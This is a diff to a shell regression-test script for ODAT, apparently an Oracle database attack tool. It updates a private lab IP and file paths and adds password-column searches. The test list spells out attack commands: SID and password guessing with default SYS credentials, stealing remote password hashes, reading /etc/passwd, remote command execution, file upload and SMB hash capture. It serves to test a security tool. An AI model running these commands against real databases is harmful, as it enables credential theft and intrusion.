@@ -2,7 +2,7 @@
 #Constants
 ALL_IS_OK=0
 #Connection information
-SERVER=192.168.56.101
+SERVER=192.168.56.102
 SID=ORCL
 USER="SYS"
 PASSWORD='oracle'
@@ -12,7 +12,7 @@ ODATBIN='./odat.py'
 
 
 tests=( "$ODATBIN all -s $SERVER"
-	"$ODATBIN all -s $SERVER --accounts-file=./accounts_small.txt --sid-charset '01' --sids-max-size=2"
+	"$ODATBIN all -s $SERVER --accounts-file=./accounts/accounts_small.txt --sid-charset '01' --sids-max-size=2"
 	"$ODATBIN all -s $SERVER --no-alias-like-sid --sids-file=./sids.txt"
 	"$ODATBIN all -s $SERVER -d $SID" 
 	"$ODATBIN all -s $SERVER -d $SID -U $USER -P $PASSWORD"
@@ -20,7 +20,7 @@ tests=( "$ODATBIN all -s $SERVER"
 	"$ODATBIN sidguesser -s $SERVER --sids-max-size=1 --sid-charset='1234'"
 	"$ODATBIN sidguesser -s $SERVER --sids-file=./sids.txt"
 	"$ODATBIN passwordguesser -s $SERVER -d $SID"
-	"$ODATBIN passwordguesser -s $SERVER -d $SID --accounts-file=./accounts_small.txt"
+	"$ODATBIN passwordguesser -s $SERVER -d $SID --accounts-file=./accounts/accounts_small.txt"
 	"$ODATBIN utlhttp -s $SERVER -d $SID -U $USER -P $PASSWORD --test-module"
 	"$ODATBIN utlhttp -s $SERVER -d $SID -U $USER -P $PASSWORD --scan-ports 127.0.0.1 1521,443,22"
 	"$ODATBIN utlhttp -s $SERVER -d $SID -U $USER -P $PASSWORD --scan-ports 127.0.0.1 20-30"
@@ -39,11 +39,11 @@ tests=( "$ODATBIN all -s $SERVER"
 	"$ODATBIN externaltable -s $SERVER -d $SID -U $USER -P $PASSWORD --getFile  /tmp/ temp.sh passwd.txt"
 	"$ODATBIN externaltable -s $SERVER -d $SID -U $USER -P $PASSWORD --exec /tmp/ temp.sh"
 	"$ODATBIN dbmsxslprocessor -s $SERVER -d $SID -U $USER -P $PASSWORD --test-module"
-	"$ODATBIN dbmsxslprocessor -s $SERVER -d $SID -U $USER -P $PASSWORD --putFile /tmp/ file.txt accounts_small.txt"
+	"$ODATBIN dbmsxslprocessor -s $SERVER -d $SID -U $USER -P $PASSWORD --putFile /tmp/ file.txt ./accounts/accounts_small.txt"
 	"$ODATBIN dbmsadvisor -s $SERVER -d $SID -U $USER -P $PASSWORD --test-module"
-	"$ODATBIN dbmsadvisor -s $SERVER -d $SID -U $USER -P $PASSWORD --putFile /tmp/ file.txt ./accounts_small.txt"
+	"$ODATBIN dbmsadvisor -s $SERVER -d $SID -U $USER -P $PASSWORD --putFile /tmp/ file.txt ./accounts/accounts_small.txt"
 	"$ODATBIN utlfile -s $SERVER -d $SID -U $USER -P $PASSWORD --test-module --getFile /etc/ passwd passwd.txt"
-	"$ODATBIN utlfile -s $SERVER -d $SID -U $USER -P $PASSWORD --putFile /tmp/ file.txt accounts_small.txt"
+	"$ODATBIN utlfile -s $SERVER -d $SID -U $USER -P $PASSWORD --putFile /tmp/ file.txt ./accounts/accounts_small.txt"
 	"$ODATBIN utlfile -s $SERVER -d $SID -U $USER -P $PASSWORD --removeFile /tmp/ file.txt"
 	"$ODATBIN dbmsscheduler -s $SERVER -d $SID -U $USER -P $PASSWORD --test-module"
 	"$ODATBIN dbmsscheduler -s $SERVER -d $SID -U $USER -P $PASSWORD --exec /bin/ls"
@@ -54,12 +54,16 @@ tests=( "$ODATBIN all -s $SERVER"
 	"$ODATBIN oradbg -s $SERVER -d $SID -U $USER -P $PASSWORD --test-module"
 	"$ODATBIN oradbg -s $SERVER -d $SID -U $USER -P $PASSWORD --exec /bin/ls"
 	"sudo $ODATBIN stealremotepwds -s $SERVER -d $SID --test-module"
-	"sudo $ODATBIN stealremotepwds -s $SERVER -d $SID --user-list accounts_small.txt --get-all-passwords"
-	"sudo chmod o+r sessions-$SERVER-1521-$SID.odat.challenge; $ODATBIN stealremotepwds -s $SERVER -d $SID --decrypt-sessions sessions-$SERVER-1521-$SID.odat.challenge accounts_small.txt"
+	"sudo $ODATBIN stealremotepwds -s $SERVER -d $SID --user-list ./accounts/accounts_small.txt --get-all-passwords"
+	"sudo chmod o+r sessions-$SERVER-1521-$SID.odat.challenge; $ODATBIN stealremotepwds -s $SERVER -d $SID --decrypt-sessions sessions-$SERVER-1521-$SID.odat.challenge ./accounts/accounts_small.txt"
 	"$ODATBIN dbmslob -s $SERVER -d $SID -U $USER -P $PASSWORD --test-module"
 	"$ODATBIN dbmslob -s $SERVER -d $SID -U $USER -P $PASSWORD --getFile /etc/ passwd temp.txt"
 	"$ODATBIN smb -s $SERVER -d $SID -U $USER -P $PASSWORD --test-module"
 	"$ODATBIN smb -s $SERVER -d $SID -U $USER -P $PASSWORD --capture 127.0.0.1 SHARE"
+	"$ODATBIN search -s $SERVER -d $SID -U $USER -P $PASSWORD --columns '%password%'"
+	"$ODATBIN search -s $SERVER -d $SID -U $USER -P $PASSWORD --columns '%password%' --show-empty-columns"
+	"$ODATBIN search -s $SERVER -d $SID -U $USER -P $PASSWORD --pwd-column-names --show-empty-columns"
+	"$ODATBIN search -s $SERVER -d $SID -U $USER -P $PASSWORD --pwd-column-names"
       )
 
 function isGoodReturnValue {
